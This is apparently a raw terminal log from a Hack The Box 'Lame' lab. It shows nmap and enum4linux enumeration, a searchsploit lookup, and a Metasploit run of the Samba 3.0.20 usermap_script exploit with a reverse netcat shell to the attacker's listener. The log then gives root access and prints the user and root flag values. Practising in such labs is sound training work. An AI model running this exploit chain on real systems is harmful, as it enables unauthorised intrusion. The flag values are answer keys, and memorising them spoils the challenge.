@@ -1,0 +1,424 @@
+nmap -T4 -A -p- -v 10.10.10.3
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 13:42 UTC
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 13:42
+Completed NSE at 13:42, 0.00s elapsed
+Initiating NSE at 13:42
+Completed NSE at 13:42, 0.00s elapsed
+Initiating NSE at 13:42
+Completed NSE at 13:42, 0.00s elapsed
+Initiating Ping Scan at 13:42
+Scanning 10.10.10.3 [4 ports]
+Completed Ping Scan at 13:42, 0.10s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 13:42
+Completed Parallel DNS resolution of 1 host. at 13:42, 0.00s elapsed
+Initiating SYN Stealth Scan at 13:42
+Scanning 10.10.10.3 [65535 ports]
+Discovered open port 21/tcp on 10.10.10.3
+Discovered open port 445/tcp on 10.10.10.3
+Discovered open port 22/tcp on 10.10.10.3
+Discovered open port 139/tcp on 10.10.10.3
+SYN Stealth Scan Timing: About 22.00% done; ETC: 13:45 (0:01:50 remaining)
+Discovered open port 3632/tcp on 10.10.10.3
+SYN Stealth Scan Timing: About 57.22% done; ETC: 13:44 (0:00:46 remaining)
+Completed SYN Stealth Scan at 13:44, 89.81s elapsed (65535 total ports)
+Initiating Service scan at 13:44
+Scanning 5 services on 10.10.10.3
+Completed Service scan at 13:44, 11.23s elapsed (5 services on 1 host)
+Initiating OS detection (try #1) against 10.10.10.3
+Retrying OS detection (try #2) against 10.10.10.3
+Initiating Traceroute at 13:44
+Completed Traceroute at 13:44, 0.09s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 13:44
+Completed Parallel DNS resolution of 2 hosts. at 13:44, 0.00s elapsed
+NSE: Script scanning 10.10.10.3.
+Initiating NSE at 13:44
+NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
+Completed NSE at 13:45, 40.06s elapsed
+Initiating NSE at 13:45
+Completed NSE at 13:45, 0.51s elapsed
+Initiating NSE at 13:45
+Completed NSE at 13:45, 0.00s elapsed
+Nmap scan report for 10.10.10.3
+Host is up (0.072s latency).
+Not shown: 65530 filtered tcp ports (no-response)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.7
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: WAP|broadband router|remote management|general purpose|storage-misc
+Running (JUST GUESSING): Linux 2.4.X|2.6.X (92%), Arris embedded (92%), Dell embedded (92%), Dell iDRAC 6 (92%), ZyXEL embedded (92%), Linksys embedded (90%)
+OS CPE: cpe:/o:linux:linux_kernel:2.4.36 cpe:/h:dell:remote_access_card:6 cpe:/o:linux:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:2.6 cpe:/o:dell:idrac6_firmware cpe:/h:zyxel:nsa-200 cpe:/h:linksys:wet54gs5
+Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), ZyXEL NSA-200 NAS device (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (90%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.010 days (since Sat May 21 13:30:58 2022)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=208 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 2h00m21s, deviation: 2h49m45s, median: 19s
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name:
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2022-05-21T09:45:00-04:00
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/Lame_10.10.10.3# enum4linux 10.10.10.3
+WARNING: polenum is not in your path.  Check that package is installed and your PATH is sane.
+WARNING: ldapsearch is not in your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 21 13:47:59 2022
+
+ =========================================( Target Information )=========================================
+
+Target ........... 10.10.10.3
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ =============================( Enumerating Workgroup/Domain on 10.10.10.3 )=============================
+
+
+[E] Can't find workgroup/domain
+
+
+
+ =================================( Nbtstat Information for 10.10.10.3 )=================================
+
+Looking up status of 10.10.10.3
+No reply from 10.10.10.3
+
+ ====================================( Session Check on 10.10.10.3 )====================================
+
+
+[+] Server 10.10.10.3 allows sessions using username '', password ''
+
+
+ =================================( Getting domain SID for 10.10.10.3 )=================================
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+ ====================================( OS information on 10.10.10.3 )====================================
+
+
+[E] Can't get OS info with smbclient
+
+
+[+] Got OS info for 10.10.10.3 from srvinfo:
+        LAME           Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian)
+        platform_id     :       500
+        os version      :       4.9
+        server type     :       0x9a03
+
+
+ ========================================( Users on 10.10.10.3 )========================================
+
+index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)
+index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
+index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
+index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
+index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
+index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
+index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
+index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
+index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
+index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
+index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
+index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
+index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
+index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
+index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
+index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
+index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
+index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
+index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
+index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
+index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
+index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
+index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
+index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
+index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
+index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
+index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
+index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
+index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
+index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
+index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
+index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
+index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
+index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
+index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)
+
+user:[games] rid:[0x3f2]
+user:[nobody] rid:[0x1f5]
+user:[bind] rid:[0x4ba]
+user:[proxy] rid:[0x402]
+user:[syslog] rid:[0x4b4]
+user:[user] rid:[0xbba]
+user:[www-data] rid:[0x42a]
+user:[root] rid:[0x3e8]
+user:[news] rid:[0x3fa]
+user:[postgres] rid:[0x4c0]
+user:[bin] rid:[0x3ec]
+user:[mail] rid:[0x3f8]
+user:[distccd] rid:[0x4c6]
+user:[proftpd] rid:[0x4ca]
+user:[dhcp] rid:[0x4b2]
+user:[daemon] rid:[0x3ea]
+user:[sshd] rid:[0x4b8]
+user:[man] rid:[0x3f4]
+user:[lp] rid:[0x3f6]
+user:[mysql] rid:[0x4c2]
+user:[gnats] rid:[0x43a]
+user:[libuuid] rid:[0x4b0]
+user:[backup] rid:[0x42c]
+user:[msfadmin] rid:[0xbb8]
+user:[telnetd] rid:[0x4c8]
+user:[sys] rid:[0x3ee]
+user:[klog] rid:[0x4b6]
+user:[postfix] rid:[0x4bc]
+user:[service] rid:[0xbbc]
+user:[list] rid:[0x434]
+user:[irc] rid:[0x436]
+user:[ftp] rid:[0x4be]
+user:[tomcat55] rid:[0x4c4]
+user:[sync] rid:[0x3f0]
+user:[uucp] rid:[0x3fc]
+
+ ==================================( Share Enumeration on 10.10.10.3 )==================================
+
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            LAME
+
+[+] Attempting to map shares on 10.10.10.3
+
+//10.10.10.3/print$     Mapping: DENIED Listing: N/A Writing: N/A
+//10.10.10.3/tmp        Mapping: OK Listing: OK Writing: N/A
+//10.10.10.3/opt        Mapping: DENIED Listing: N/A Writing: N/A
+
+[E] Can't understand response:
+
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*
+//10.10.10.3/IPC$       Mapping: N/A Listing: N/A Writing: N/A
+//10.10.10.3/ADMIN$     Mapping: DENIED Listing: N/A Writing: N/A
+
+ =============================( Password Policy Information for 10.10.10.3 )=============================
+
+
+[E] Dependent program "polenum" not present.  Skipping this check.  Download polenum from http://labs.portcullis.co.uk/application/polenum/
+
+
+
+ ========================================( Groups on 10.10.10.3 )========================================
+
+
+[+] Getting builtin groups:
+
+
+[+]  Getting builtin group memberships:
+
+
+[+]  Getting local groups:
+
+
+[+]  Getting local group memberships:
+
+
+[+]  Getting domain groups:
+
+
+[+]  Getting domain group memberships:
+
+
+ ===================( Users on 10.10.10.3 via RID cycling (RIDS: 500-550,1000-1050) )===================
+
+
+[I] Found new SID:
+S-1-5-21-2446995257-2525374255-2673161615
+
+[+] Enumerating users using SID S-1-5-21-2446995257-2525374255-2673161615 and logon username '', password ''
+
+S-1-5-21-2446995257-2525374255-2673161615-500 LAME\Administrator (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-501 LAME\nobody (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-512 LAME\Domain Admins (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-513 LAME\Domain Users (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-514 LAME\Domain Guests (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1000 LAME\root (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1001 LAME\root (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1002 LAME\daemon (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1003 LAME\daemon (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1004 LAME\bin (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1005 LAME\bin (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1006 LAME\sys (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1007 LAME\sys (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1008 LAME\sync (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1009 LAME\adm (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1010 LAME\games (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1011 LAME\tty (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1012 LAME\man (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1013 LAME\disk (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1014 LAME\lp (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1015 LAME\lp (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1016 LAME\mail (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1017 LAME\mail (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1018 LAME\news (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1019 LAME\news (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1020 LAME\uucp (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1021 LAME\uucp (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1025 LAME\man (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1026 LAME\proxy (Local User)
+S-1-5-21-2446995257-2525374255-2673161615-1027 LAME\proxy (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1031 LAME\kmem (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1041 LAME\dialout (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1043 LAME\fax (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1045 LAME\voice (Domain Group)
+S-1-5-21-2446995257-2525374255-2673161615-1049 LAME\cdrom (Domain Group)
+
+ ================================( Getting printer info for 10.10.10.3 )================================
+
+No printers returned.
+
+
+enum4linux complete on Sat May 21 13:51:04 2022
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/Lame_10.10.10.3# searchsploit Samba 3.0.20
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                     | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                           | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                      | linux/remote/7701.txt
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                      | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                              | linux_x86/dos/36741.py
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/Lame_10.10.10.3# msfconsole -q
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:10: warning: constant Gem::ConfigMap is deprecated
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:10: warning: constant Gem::ConfigMap is deprecated
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:29: warning: constant Gem::ConfigMap is deprecated
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:30: warning: constant Gem::ConfigMap is deprecated
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:10: warning: constant Gem::ConfigMap is deprecated
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:10: warning: constant Gem::ConfigMap is deprecated
+Ignoring nokogiri-1.8.2 because its extensions are not built. Try: gem pristine nokogiri --version 1.8.2
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:10: warning: constant Gem::ConfigMap is deprecated
+/usr/lib/ruby/vendor_ruby/rubygems/defaults/operating_system.rb:10: warning: constant Gem::ConfigMap is deprecated
+[*] Starting persistent handler(s)...
+msf6 > search Samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 > use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   139              yes       The target port (TCP)
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  157.230.171.67   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
+rhosts => 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.7
+lhost => 10.10.14.7
+msf6 exploit(multi/samba/usermap_script) > run
+
+[*] Started reverse TCP handler on 10.10.14.7:4444
+[*] Command shell session 1 opened (10.10.14.7:4444 -> 10.10.10.3:33075 ) at 2022-05-21 14:23:04 +0000
+
+id
+uid=0(root) gid=0(root)
+cd /root
+ls
+Desktop
+reset_logs.sh
+root.txt
+vnc.log
+cat root.txt
+c38448a0168617de218041bee4c36e5c
+
+cd /home
+ls
+ftp
+makis
+service
+user
+find . -name user.txt
+./makis/user.txt
+cat ./makis/user.txt
+f67f91763acdbe4aa8582949711db4b9
+
